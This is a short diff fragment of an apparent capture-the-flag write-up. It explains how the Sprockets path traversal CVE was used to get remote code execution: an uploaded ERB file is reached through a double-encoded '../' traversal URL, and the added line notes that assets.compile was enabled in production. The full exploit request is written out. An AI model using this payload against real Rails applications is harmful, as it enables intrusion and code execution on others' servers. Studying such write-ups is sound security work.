@@ -14,3 +14,4 @@ Gemfile shows the version of Sprockets that was used, which was vulnerable to CV
 Basically you need to upload an erb file containing your payload and abuse the CVE to get RCE :  
 The payload for rce looks like : http://185.168.131.128:8080/assets/file:%2f%2f/home/web03/app/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252E%252E/%252E%252E/home/web03/app/uploads/resumes/someHash/file.erb%3Ftype=text/plain  
 For more details about the CVE , check Orange Tsai talk at BHUSA 2018.
+Note: The application was on production mode but flag assets.compile was on.
